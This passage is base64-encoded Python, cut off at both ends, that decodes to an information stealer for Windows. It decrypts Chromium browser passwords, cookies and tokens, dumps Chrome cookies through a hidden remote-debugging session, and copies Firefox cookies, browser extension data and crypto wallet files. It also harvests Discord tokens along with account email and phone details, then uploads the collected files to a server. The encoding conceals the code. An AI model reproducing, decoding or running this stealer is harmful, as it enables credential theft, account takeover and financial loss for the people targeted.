CBpbmplY3RfYXRvbWljKCkKCiAgICAgICAgYnJlYWsKCiAgICBleGNlcHQ6IHBhc3MKCgoKZm9yIGJyb3dzZXIgaW4gQ0hST01JVU1fQlJPV1NFUlM6CgogICAgdGFza2tpbGwoYnJvd3NlclsidGFza25hbWUiXSkKCiAgICBsb2NhbF9zdGF0ZSA9IG9zLnBhdGguam9pbihicm93c2VyWyJwYXRoIl0sICJMb2NhbCBTdGF0ZSIpCgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGxvY2FsX3N0YXRlKTogY29udGludWUKCiAgICB3aXRoIG9wZW4obG9jYWxfc3RhdGUsICJyIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKCiAgICAgICAgbG9jYWxfc3RhdGUgPSBqc29uLmxvYWRzKGYucmVhZCgpKQoKICAgIGtleSA9IGJhc2U2NC5iNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSlbNTpdCgogICAgZGVjcnlwdGlvbl9rZXkgPSB3aW4zMmNyeXB0LkNyeXB0VW5wcm90ZWN0RGF0YShrZXksIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdCgogICAgZm9yIHN1YnBhdGggaW4gQ0hST01JVU1fU1VCUEFUSFM6CgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhvcy5wYXRoLmpvaW4oYnJvd3NlclsicGF0aCJdLCBzdWJwYXRoWyJwYXRoIl0pKTogY29udGludWUKCiAgICAgICAgdHJ5OgoKICAgICAgICAgICAgbG9naW5fZGF0YV9maWxlID0gb3MucGF0aC5qb2luKGJyb3dzZXJbInBhdGgiXSwgc3VicGF0aFsicGF0aCJdLCAiTG9naW4gRGF0YSIpCgogICAgICAgICAgICB0ZW1wX2RiID0gb3MucGF0aC5qb2luKGJyb3dzZXJbInBhdGgiXSwgc3VicGF0aFsicGF0aCJdLCBmInticm93c2VyWyduYW1lJ119LXB3LmRiIikKCiAgICAgICAgICAgIHNodXRpbC5jb3B5KGxvZ2luX2RhdGFfZmlsZSwgdGVtcF9kYikKCiAgICAgICAgICAgIGNvbm5lY3Rpb24gPSBzcWxpdGUzLmNvbm5lY3QodGVtcF9kYikKCiAgICAgICAgICAgIGN1cnNvciA9IGNvbm5lY3Rpb24uY3Vyc29yKCkKCiAgICAgICAgICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1Qgb3JpZ2luX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zIikKCiAgICAgICAgICAgIGZvciByb3cgaW4gY3Vyc29yLmZldGNoYWxsKCk6CgogICAgICAgICAgICAgICAgb3JpZ2luX3VybCA9IHJvd1swXQoKICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gcm93WzFdCgogICAgICAgICAgICAgICAgcGFzc3dvcmQgPSBkZWNyeXB0X2RhdGEocm93WzJdLCBkZWNyeXB0aW9uX2tleSkKCiAgICAgICAgICAgICAgICBpZiB1c2VybmFtZSBvciBwYXNzd29yZDoKCiAgICAgICAgICAgICAgICAgICAgUEFTU1dPUkRTLmFwcGVuZCh7ImJyb3dzZXIiOiBicm93c2VyWyJuYW1lIl0sICJwcm9maWxlIjogc3VicGF0aFsibmFtZSJdLCAidXJsIjogb3JpZ2luX3VybCwgInVzZXJuYW1lIjogdXNlcm5hbWUsICJwYXNzd29yZCI6IHBhc3N3b3JkfSkKCiAgICAgICAgICAgIGN1cnNvci5jbG9zZSgpCgogICAgICAgICAgICBjb25uZWN0aW9uLmNsb3NlKCkKCiAgICAgICAgICAgIG9zLnJlbW92ZSh0ZW1wX2RiKQoKICAgICAgICBleGNlcHQ6CgogICAgICAgICAgICBwYXNzCgoKCiAgICAgICAgdHJ5OgoKICAgICAgICAgICAgY29va2llc19maWxlID0gb3MucGF0aC5qb2luKGJyb3dzZXJbInBhdGgiXSwgc3VicGF0aFsicGF0aCJdLCAiTmV0d29yayIsICJDb29raWVzIikKCiAgICAgICAgICAgIHRlbXBfZGIgPSBvcy5wYXRoLmpvaW4oYnJvd3NlclsicGF0aCJdLCBzdWJwYXRoWyJwYXRoIl0sICJOZXR3b3JrIiwgZiJ7YnJvd3NlclsnbmFtZSddfS1jay5kYiIpCgogICAgICAgICAgICBzaHV0aWwuY29weShjb29raWVzX2ZpbGUsIHRlbXBfZGIpCgogICAgICAgICAgICBjb25uZWN0aW9uID0gc3FsaXRlMy5jb25uZWN0KHRlbXBfZGIpCgogICAgICAgICAgICBjdXJzb3IgPSBjb25uZWN0aW9uLmN1cnNvcigpCgogICAgICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBlbmNyeXB0ZWRfdmFsdWUgRlJPTSBjb29raWVzIikKCiAgICAgICAgICAgIGNvb2tpZV9zdHIgPSAiIgoKICAgICAgICAgICAgZm9yIHJvdyBpbiBjdXJzb3IuZmV0Y2hhbGwoKToKCiAgICAgICAgICAgICAgICBob3N0ID0gcm93WzBdCgogICAgICAgICAgICAgICAgbmFtZSA9IHJvd1sxXQoKICAgICAgICAgICAgICAgIHZhbHVlID0gZGVjcnlwdF9kYXRhKHJvd1syXSwgZGVjcnlwdGlvbl9rZXkpCgogICAgICAgICAgICAgICAgY29va2llX3N0ciArPSBmIntob3N0fVx0VFJVRVx0L1x0RkFMU0VcdDEzMzU1ODYxMjc4ODQ5Njk4XHR7bmFtZX1cdHt2YWx1ZX1cbiIKCiAgICAgICAgICAgIENPT0tJRVMuYXBwZW5kKHsiYnJvd3NlciI6IGJyb3dzZXJbIm5hbWUiXSwgInByb2ZpbGUiOiBzdWJwYXRoWyJuYW1lIl0sICJjb29raWVzIjogYmFzZTY0LmI2NGVuY29kZShjb29raWVfc3RyLmVuY29kZSgpKS5kZWNvZGUoKX0pCgogICAgICAgICAgICBjdXJzb3IuY2xvc2UoKQoKICAgICAgICAgICAgY29ubmVjdGlvbi5jbG9zZSgpCgogICAgICAgICAgICBvcy5yZW1vdmUodGVtcF9kYikKCiAgICAgICAgZXhjZXB0OgoKICAgICAgICAgICAgcGFzcwoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdlYl9kYXRhX2ZpbGUgPSBvcy5wYXRoLmpvaW4oYnJvd3NlclsicGF0aCJdLCBzdWJwYXRoWyJwYXRoIl0sICJXZWIgRGF0YSIpCgogICAgICAgICAgICB0ZW1wX2RiID0gb3MucGF0aC5qb2luKGJyb3dzZXJbInBhdGgiXSwgc3VicGF0aFsicGF0aCJdLCBmInticm93c2VyWyduYW1lJ119LXdlYmRhdGEuZGIiKQoKICAgICAgICAgICAgc2h1dGlsLmNvcHkod2ViX2RhdGFfZmlsZSwgdGVtcF9kYikKCiAgICAgICAgICAgIGNvbm5lY3Rpb24gPSBzcWxpdGUzLmNvbm5lY3QodGVtcF9kYikKCiAgICAgICAgICAgIGN1cnNvciA9IGNvbm5lY3Rpb24uY3Vyc29yKCkKCiAgICAgICAgICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1Qgc2VydmljZSwgZW5jcnlwdGVkX3Rva2VuIEZST00gdG9rZW5fc2VydmljZSIpCgogICAgICAgICAgICBmb3Igcm93IGluIGN1cnNvci5mZXRjaGFsbCgpOgoKICAgICAgICAgICAgICAgIHdlYl9zZXJ2aWNlID0gcm93WzBdCgogICAgICAgICAgICAgICAgd2ViX3Rva2VuID0gZGVjcnlwdF9kYXRhKHJvd1sxXSwgZGVjcnlwdGlvbl9rZXkpCgogICAgICAgICAgICAgICAgV0VCX0RBVEEuYXBwZW5kKHsiYnJvd3NlciI6IGJyb3dzZXJbIm5hbWUiXSwgInByb2ZpbGUiOiBzdWJwYXRoWyJuYW1lIl0sICJzZXJ2aWNlIjogd2ViX3NlcnZpY2UsICJ0b2tlbiI6IHdlYl90b2tlbn0pCgogICAgICAgICAgICBjdXJzb3IuY2xvc2UoKQoKICAgICAgICAgICAgY29ubmVjdGlvbi5jbG9zZSgpCgogICAgICAgICAgICBvcy5yZW1vdmUodGVtcF9kYikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCgogICAgICAgIGZvciBleHRlbnNpb24gaW4gQlJPV1NFUl9FWFRFTlNJT05TOgoKICAgICAgICAgICAgZXh0ZW5zaW9uX3BhdGggPSBvcy5wYXRoLmpvaW4oYnJvd3NlclsicGF0aCJdLCBzdWJwYXRoWyJwYXRoIl0pICsgZXh0ZW5zaW9uWyJwYXRoIl0KCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGV4dGVuc2lvbl9wYXRoKToKCiAgICAgICAgICAgICAgICB0cnk6CgogICAgICAgICAgICAgICAgICAgIHppcF90b19zdG9yYWdlKGYie2Jyb3dzZXJbJ25hbWUnXX0te3N1YnBhdGhbJ25hbWUnXX0te2V4dGVuc2lvblsnbmFtZSddfSIsIGV4dGVuc2lvbl9wYXRoLCBTVE9SQUdFX1BBVEgpCgogICAgICAgICAgICAgICAgZXhjZXB0OgoKICAgICAgICAgICAgICAgICAgICBwYXNzCgpmaXJlZm94X3BhdGggPSBvcy5wYXRoLmpvaW4oQVBQREFUQSwgJ01vemlsbGEnLCAnRmlyZWZveCcsICdQcm9maWxlcycpCgppZiBvcy5wYXRoLmV4aXN0cyhmaXJlZm94X3BhdGgpOgoKICAgIHRhc2traWxsKCJmaXJlZm94LmV4ZSIpCgogICAgZm9yIHByb2ZpbGUgaW4gb3MubGlzdGRpcihmaXJlZm94X3BhdGgpOgoKICAgICAgICB0cnk6CgogICAgICAgICAgICBpZiBwcm9maWxlLmVuZHN3aXRoKCcuZGVmYXVsdCcpIG9yIHByb2ZpbGUuZW5kc3dpdGgoJy5kZWZhdWx0LXJlbGVhc2UnKToKCiAgICAgICAgICAgICAgICBwcm9maWxlX3BhdGggPSBvcy5wYXRoLmpvaW4oZmlyZWZveF9wYXRoLCBwcm9maWxlKQoKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihwcm9maWxlX3BhdGgsICJjb29raWVzLnNxbGl0ZSIpKToKCiAgICAgICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkob3MucGF0aC5qb2luKHByb2ZpbGVfcGF0aCwgImNvb2tpZXMuc3FsaXRlIiksIG9zLnBhdGguam9pbihwcm9maWxlX3BhdGgsICJjb29raWVzLWNvcHkuc3FsaXRlIikpCgogICAgICAgICAgICAgICAgICAgIGNvbm5lY3Rpb24gPSBzcWxpdGUzLmNvbm5lY3Qob3MucGF0aC5qb2luKHByb2ZpbGVfcGF0aCwgImNvb2tpZXMtY29weS5zcWxpdGUiKSkKCiAgICAgICAgICAgICAgICAgICAgY3Vyc29yID0gY29ubmVjdGlvbi5jdXJzb3IoKQoKICAgICAgICAgICAgICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGhvc3QsIG5hbWUsIHZhbHVlIEZST00gbW96X2Nvb2tpZXMiKQoKICAgICAgICAgICAgICAgICAgICBjb29raWVfc3RyID0gIiIKCiAgICAgICAgICAgICAgICAgICAgZm9yIHJvdyBpbiBjdXJzb3IuZmV0Y2hhbGwoKToKCiAgICAgICAgICAgICAgICAgICAgICAgIGhvc3QsIG5hbWUsIHZhbHVlID0gcm93CgogICAgICAgICAgICAgICAgICAgICAgICBjb29raWVfc3RyICs9IGYie2hvc3R9XHRUUlVFXHQvXHRGQUxTRVx0MTMzNTU4NjEyNzg4NDk2OThcdHtuYW1lfVx0e3ZhbHVlfVxuIgoKICAgICAgICAgICAgICAgICAgICBDT09LSUVTLmFwcGVuZCh7ImJyb3dzZXIiOiAiRmlyZWZveCIsICJwcm9maWxlIjogcHJvZmlsZSwgImNvb2tpZXMiOiBiYXNlNjQuYjY0ZW5jb2RlKGNvb2tpZV9zdHIuZW5jb2RlKCkpLmRlY29kZSgpfSkKCiAgICAgICAgICAgICAgICAgICAgY3Vyc29yLmNsb3NlKCkKCiAgICAgICAgICAgICAgICAgICAgY29ubmVjdGlvbi5jbG9zZSgpCgogICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShvcy5wYXRoLmpvaW4ocHJvZmlsZV9wYXRoLCAiY29va2llcy1jb3B5LnNxbGl0ZSIpKQoKICAgICAgICBleGNlcHQ6CgogICAgICAgICAgICBjb250aW51ZQoKCgpmb3Igd2FsbGV0X2ZpbGUgaW4gV0FMTEVUX1BBVEhTOgoKICAgIGlmIG9zLnBhdGguZXhpc3RzKHdhbGxldF9maWxlWyJwYXRoIl0pOgoKICAgICAgICB0cnk6CgogICAgICAgICAgICB6aXBfdG9fc3RvcmFnZSh3YWxsZXRfZmlsZVsibmFtZSJdLCB3YWxsZXRfZmlsZVsicGF0aCJdLCBTVE9SQUdFX1BBVEgpCgogICAgICAgIGV4Y2VwdDoKCiAgICAgICAgICAgIHBhc3MKCgpjaHJvbWVfcGF0aCA9IE5vbmUKaWYgb3MucGF0aC5leGlzdHMoIkM6XFxQcm9ncmFtIEZpbGVzXFxHb29nbGVcXENocm9tZVxcQXBwbGljYXRpb25cXGNocm9tZS5leGUiKToKICAgIGNocm9tZV9wYXRoID0gIkM6XFxQcm9ncmFtIEZpbGVzXFxHb29nbGVcXENocm9tZVxcQXBwbGljYXRpb25cXGNocm9tZS5leGUiCmVsaWYgb3MucGF0aC5leGlzdHMoIkM6XFxQcm9ncmFtIEZpbGVzICh4ODYpXFxHb29nbGVcXENocm9tZVxcQXBwbGljYXRpb25cXGNocm9tZS5leGUiKToKICAgIGNocm9tZV9wYXRoID0gIkM6XFxQcm9ncmFtIEZpbGVzICh4ODYpXFxHb29nbGVcXENocm9tZVxcQXBwbGljYXRpb25cXGNocm9tZS5leGUiCgppZiBjaHJvbWVfcGF0aCBpcyBub3QgTm9uZToKICAgIGZvciBwcm9maWxlIGluIFsiRGVmYXVsdCIsICJQcm9maWxlIDEiLCAiUHJvZmlsZSAyIiwgIlByb2ZpbGUgMyIsICJQcm9maWxlIDQiLCAiUHJvZmlsZSA1Il06CiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoTE9DQUxBUFBEQVRBICsgZiJcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXHtwcm9maWxlfSIpOgogICAgICAgICAgICB0YXNra2lsbCgiY2hyb21lLmV4ZSIpCiAgICAgICAgICAgIHN0cnRjbWQgPSBmJyJ7Y2hyb21lX3BhdGh9IiAtLXdpbmRvdy1wb3NpdGlvbj0tMjQwMCwtMjQwMCAtLXJlbW90ZS1kZWJ1Z2dpbmctcG9ydD05MjIyIC0tcmVtb3RlLWFsbG93LW9yaWdpbnM9KiAtLXByb2ZpbGUtZGlyZWN0b3J5PSJ7cHJvZmlsZX0iJwogICAgICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKHN0cnRjbWQsIGNyZWF0aW9uZmxhZ3M9c3VicHJvY2Vzcy5DUkVBVEVfTkVXX0NPTlNPTEUsIGNsb3NlX2Zkcz1UcnVlKQogICAgICAgICAgICB0YXJnZXRzID0gcmVxdWVzdHMuZ2V0KCJodHRwOi8vbG9jYWxob3N0OjkyMjIvanNvbiIpLmpzb24oKQogICAgICAgICAgICB3c191cmwgPSB0YXJnZXRzWzBdWyJ3ZWJTb2NrZXREZWJ1Z2dlclVybCJdCiAgICAgICAgICAgIHdzID0gd2Vic29ja2V0LmNyZWF0ZV9jb25uZWN0aW9uKHdzX3VybCkKICAgICAgICAgICAgcGF5bG9hZCA9IHsKICAgICAgICAgICAgICAgICJpZCI6IDEsCiAgICAgICAgICAgICAgICAibWV0aG9kIjogIlN0b3JhZ2UuZ2V0Q29va2llcyIsCiAgICAgICAgICAgICAgICAicGFyYW1zIjoge30KICAgICAgICAgICAgfQogICAgICAgICAgICB3cy5zZW5kKGpzb24uZHVtcHMocGF5bG9hZCkpCiAgICAgICAgICAgIGNvb2tpZV9zdHIgPSAiIgogICAgICAgICAgICBmb3IgY29va2llIGluIGpzb24ubG9hZHMod3MucmVjdigpKVsicmVzdWx0Il1bImNvb2tpZXMiXToKICAgICAgICAgICAgICAgIGNvb2tpZV9zdHIgKz0gZiJ7Y29va2llWydkb21haW4nXX1cdFRSVUVcdC9cdEZBTFNFXHQxMzM1NTg2MTI3ODg0OTY5OFx0e2Nvb2tpZVsnbmFtZSddfVx0e2Nvb2tpZVsndmFsdWUnXX1cbiIKICAgICAgICAgICAgd2l0aCBvcGVuKFNUT1JBR0VfUEFUSCArIGYiXFxDb29raWVzLUNocm9tZS1OZXcte3Byb2ZpbGV9LnR4dCIsICJ3IikgYXMgZjoKICAgICAgICAgICAgICAgIGYud3JpdGUoY29va2llX3N0cikKICAgICAgICAgICAgd3MuY2xvc2UoKQogICAgICAgICAgICB0YXNra2lsbCgiY2hyb21lLmV4ZSIpCgoKCgoKCmZvciBkaXNjb3JkX3BhdGggaW4gRElTQ09SRF9QQVRIUzoKCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZGlzY29yZF9wYXRoWyJwYXRoIl0pOiBjb250aW51ZQoKICAgIHRyeToKCiAgICAgICAgbmFtZV93aXRob3V0X3NwYWNlcyA9IGRpc2NvcmRfcGF0aFsibmFtZSJdLnJlcGxhY2UoIiAiLCAiIikKCiAgICAgICAgaWYgImNvcmQiIGluIGRpc2NvcmRfcGF0aFsicGF0aCJdOgoKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKEFQUERBVEEgKyBmIlxce25hbWVfd2l0aG91dF9zcGFjZXN9XFxMb2NhbCBTdGF0ZSIpOiBjb250aW51ZQoKICAgICAgICAgICAgdHJ5OgoKICAgICAgICAgICAgICAgIHdpdGggb3BlbihBUFBEQVRBICsgZiJcXHtuYW1lX3dpdGhvdXRfc3BhY2VzfVxcTG9jYWwgU3RhdGUiLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CgogICAgICAgICAgICAgICAgICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2FkcyhmLnJlYWQoKSkKCiAgICAgICAgICAgICAgICBrZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWyJvc19jcnlwdCJdWyJlbmNyeXB0ZWRfa2V5Il0pWzU6XQoKICAgICAgICAgICAgICAgIGRlY3J5cHRpb25fa2V5ID0gd2luMzJjcnlwdC5DcnlwdFVucHJvdGVjdERhdGEoa2V5LCBOb25lLCBOb25lLCBOb25lLCAwKVsxXQoKICAgICAgICAgICAgICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihkaXNjb3JkX3BhdGhbInBhdGgiXSk6CgogICAgICAgICAgICAgICAgICAgIGlmIGZpbGVfbmFtZVstMzpdIG5vdCBpbiBbImxkYiIsICJsb2ciXTogY29udGludWUKCiAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne2Rpc2NvcmRfcGF0aFsicGF0aCJdfVxce2ZpbGVfbmFtZX0nLCBlcnJvcnM9J2lnbm9yZScpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgeSBpbiByZS5maW5kYWxsKHIiZFF3NHc5V2dYY1E6W15cIl0qIiwgbGluZSk6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW4gPSBkZWNyeXB0X2RhdGEoYmFzZTY0LmI2NGRlY29kZSh5LnNwbGl0KCdkUXc0dzlXZ1hjUTonKVsxXSksIGRlY3J5cHRpb25fa2V5KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRva2VuX2RhdGEgPSB2YWxpZGF0ZV9kaXNjb3JkX3Rva2VuKHRva2VuKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRva2VuX2RhdGE6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRva2VuX2RhdGFbImlkIl0gbm90IGluIERJU0NPUkRfSURTOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRElTQ09SRF9JRFMuYXBwZW5kKHRva2VuX2RhdGFbImlkIl0pCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IHRva2VuX2RhdGFbInVzZXJuYW1lIl0gaWYgdG9rZW5fZGF0YVsiZGlzY3JpbWluYXRvciJdID09ICIwIiBlbHNlIGYie3Rva2VuX2RhdGFbJ3VzZXJuYW1lJ119I3t0b2tlbl9kYXRhWydkaXNjcmltaW5hdG9yJ119IgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGhvbmVfbnVtYmVyID0gdG9rZW5fZGF0YVsicGhvbmUiXSBpZiB0b2tlbl9kYXRhWyJwaG9uZSJdIGVsc2UgIk5vdCBsaW5rZWQiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERJU0NPUkRfVE9LRU5TLmFwcGVuZCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsidG9rZW4iOiB0b2tlbiwgInVzZXJfaWQiOiB0b2tlbl9kYXRhWyJpZCJdLCAidXNlcm5hbWUiOiB1c2VybmFtZSwKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImRpc3BsYXlfbmFtZSI6IHRva2VuX2RhdGFbImdsb2JhbF9uYW1lIl0sICJlbWFpbCI6IHRva2VuX2RhdGFbImVtYWlsIl0sCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJwaG9uZSI6IHBob25lX251bWJlcn0pCgogICAgICAgICAgICBleGNlcHQ6CgogICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICBlbHNlOgoKICAgICAgICAgICAgZm9yIGZpbGVfbmFtZSBpbiBvcy5saXN0ZGlyKGRpc2NvcmRfcGF0aFsicGF0aCJdKToKCiAgICAgICAgICAgICAgICBpZiBmaWxlX25hbWVbLTM6XSBub3QgaW4gWyJsZGIiLCAibG9nIl06IGNvbnRpbnVlCgogICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne2Rpc2NvcmRfcGF0aFsicGF0aCJdfVxce2ZpbGVfbmFtZX0nLCBlcnJvcnM9J2lnbm9yZScpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CgogICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHIiW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17MjUsMTEwfSIsIGxpbmUpOgoKICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW5fZGF0YSA9IHZhbGlkYXRlX2Rpc2NvcmRfdG9rZW4odG9rZW4pCgogICAgICAgICAgICAgICAgICAgICAgICBpZiB0b2tlbl9kYXRhOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRva2VuX2RhdGFbImlkIl0gbm90IGluIERJU0NPUkRfSURTOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBESVNDT1JEX0lEUy5hcHBlbmQodG9rZW5fZGF0YVsiaWQiXSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSB0b2tlbl9kYXRhWyJ1c2VybmFtZSJdIGlmIHRva2VuX2RhdGFbImRpc2NyaW1pbmF0b3IiXSA9PSAiMCIgZWxzZSBmInt0b2tlbl9kYXRhWyd1c2VybmFtZSddfSN7dG9rZW5fZGF0YVsnZGlzY3JpbWluYXRvciddfSIKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGhvbmVfbnVtYmVyID0gdG9rZW5fZGF0YVsicGhvbmUiXSBpZiB0b2tlbl9kYXRhWyJwaG9uZSJdIGVsc2UgIk5vdCBsaW5rZWQiCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERJU0NPUkRfVE9LRU5TLmFwcGVuZCgKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsidG9rZW4iOiB0b2tlbiwgInVzZXJfaWQiOiB0b2tlbl9kYXRhWyJpZCJdLCAidXNlcm5hbWUiOiB1c2VybmFtZSwKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZGlzcGxheV9uYW1lIjogdG9rZW5fZGF0YVsiZ2xvYmFsX25hbWUiXSwgImVtYWlsIjogdG9rZW5fZGF0YVsiZW1haWwiXSwKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAicGhvbmUiOiBwaG9uZV9udW1iZXJ9KQoKICAgIGV4Y2VwdDoKCiAgICAgICAgcGFzcwoKCgoKCndpdGggb3BlbihTVE9SQUdFX1BBVEggKyAiXFxQYXNzd29yZHMudHh0IiwgInciLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgoKICAgIGYud3JpdGUoCgogICAgICAgIGYiXG57Jy0nKjUwfVxuIi5qb2luKFsKCiAgICAgICAgICAgIGYiTE9DQVRJT046IHtwd1snYnJvd3NlciddfSAtIHtwd1sncHJvZmlsZSddfVxuIgoKICAgICAgICAgICAgZiJVUkw6IHtwd1sndXJsJ119XG4iCgogICAgICAgICAgICBmIlVTRVJOQU1FOiB7cHdbJ3VzZXJuYW1lJ119XG4iCgogICAgICAgICAgICBmIlBBU1NXT1JEOiB7cHdbJ3Bhc3N3b3JkJ119IgoKICAgICAgICAgICAgZm9yIHB3IGluIFBBU1NXT1JEUwoKICAgICAgICBdKQoKICAgICkKCnVwbG9hZF90b19zZXJ2ZXIoU1RPUkFHRV9QQVRIICsgIlxcUGFzc3dvcmRzLnR4dCIpCgpmb3IgY29va2llIGluIENPT0tJRVM6CgogICAgd2l0aCBvcGVuKFNUT1JBR0VfUEFUSCArIGYiXFxDb29raWVzLXtjb29raWVbJ2Jyb3dzZXInXX0te2Nvb2tpZVsncHJvZmlsZSddfS50eHQiLCAidyIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CgogICAgICAgIGYud3JpdGUoYmFzZTY0LmI2NGRlY29kZShjb29raWVbImNvb2tpZXMiXSkuZGVjb2RlKCkpCgp3aXRoIG9wZW4oU1RPUkFHRV9QQVRIICsgIlxcR1JVUFBFX1dFQl9EQVRBLnR4dCIsICJ3IiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKCiAgICBmLndyaXRlKAogICAgICAgIGYiXG57Jy0nICogNTB9XG4iLmpvaW4oWwoKICAgICAgICAgICAgZiJMT0NBVElPTjoge3dfZGF0YVsnYnJvd3NlciddfSAtIHt3X2RhdGFbJ3Byb2ZpbGUnXX1cbiIKCiAgICAgICAgICAgIGYiU0VSVklDRToge3dfZGF0YVsnc2VydmljZSddfVxuIgoKICAgICAgICAgICAgZiJUT0tFTjoge3dfZGF0YVsndG9rZW4nXX1cbiIKICAgICAgICAgICAgCiAgICAgICAgICAgIGYie3dfZGF0YVsnc2VydmljZSddLnJlcGxhY2UoJ0FjY291bnRJZC0nLCAnJyl9Ont3X2RhdGFbJ3Rva2VuJ119IgoKICAgICAgICAgICAgZm9yIHdfZGF0YSBpbiBXRUJfREFUQQogICAgICAgIF0pCgogICAgKQoKCmZvciBkaXNjb3JkX3Rva2VuIGluIERJU0NPUkRfVE9LRU5TOgoKICAgIHdpdGggb3BlbihTVE9SQUdFX1BBVEggKyAiXFxkaXNjb3JkLXRva2Vucy50eHQiLCAidyIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CgogICAgICAgIGYud3JpdGUoCgogICAgICAgICAgICBmIlxueyctJyAqIDUwfVxuIi5qb2luKFsKCiAgICAgICAgICAgICAgICBmIklEOiB7ZGlzY29yZF90b2tlblsndXNlcl9pZCddfVxuIgoKICAgICAgICAgICAgICAgIGYiVVNFUk5BTUU6IHtkaXNjb3JkX3Rva2VuWyd1c2VybmFtZSddfVxuIgoKICAgICAgICAgICAgICAgIGYiRElTUExBWSBOQU1FOiB7ZGlzY29yZF90b2tlblsnZGlzcGxheV9uYW1lJ119XG4iCgogICAgICAgICAgICAgICAgZiJFTUFJTDoge2Rpc2NvcmRfdG9rZW5bJ2VtYWlsJ119XG4iCgogICAgICAgICAgICAgICAgZiJQSE9ORToge2Rpc2NvcmRfdG9rZW5bJ3Bob25lJ119XG4iCgogICAgICAgICAgICAgICAgZiJUT0tFTjoge2Rpc2NvcmRfdG9rZW5bJ3Rva2VuJ119IgoKICAgICAgICAgICAgICAgIGZvciBkaXNjb3JkX3Rva2VuIGluIERJU0NPUkRfVE9LRU5TCgogICAgICAgICAgICBdKQoKICAgICAgICApCgoKCmZvciBmaWxlX3RvX3VwbG9hZCBpbiBvcy5saXN0ZGlyKFNUT1JBR0VfUEFUSCk6CgogICAgdHJ5OgoKICAgICAgICB1cGxvYWRfdG9fc2VydmVyKFNUT1JBR0VfUEFUSCArICJcXCIgKyBmaWxlX3RvX3VwbG9hZCkKCiAgICBleGNlcHQ6CgogICAgICAgIHBhc3MKCmZvciBwYXRoIGluIFBBVEhTX1RPX1NFQVJDSDoKCiAgICBmb3Igcm9vdCwgXywgZmlsZXMgaW4gb3Mud2FsayhwYXRoKToKCiAgICAgICAgZm9yIGZpbGVfbmFtZSBpbiBmaWxlczoKCiAgICAgICAgICAgIGZvciBrZXl3b3JkIGluIEZJTEVfS0VZV09SRFM6CgogICAgICAgICAgICAgICAgaWYga2V5d29yZCBpbiBmaWxlX25hbWUubG93ZXIoKToKCiAgICAgICAgICAgICAgICAgICAgZm9yIGV4dGVuc2lvbiBpbiBBTExPV0VEX0VYVEVOU0lPTlM6CgogICAgICAgICAgICAgICAgICAgICAgICBpZiBmaWxlX25hbWUuZW5k